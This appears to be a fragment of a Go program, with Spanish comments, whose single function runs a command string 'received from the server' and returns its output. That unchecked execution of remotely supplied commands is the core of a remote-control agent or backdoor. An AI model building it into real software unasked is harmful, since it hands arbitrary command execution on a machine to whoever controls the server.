package main

import (
	"os/exec"
	"strings"
)

// Ejecutar un comando recibido del servidor
func executeCommand(command string) (string, error) {
	// Separar el comando y los argumentos
	parts := strings.Fields(command)
	if len(parts) == 0 {
		return "", nil // Comando vacío
	}

	// Ejecutar el comando
	cmd := exec.Command(parts[0], parts[1:]...)
	output, err := cmd.CombinedOutput()
	return string(output), err
}
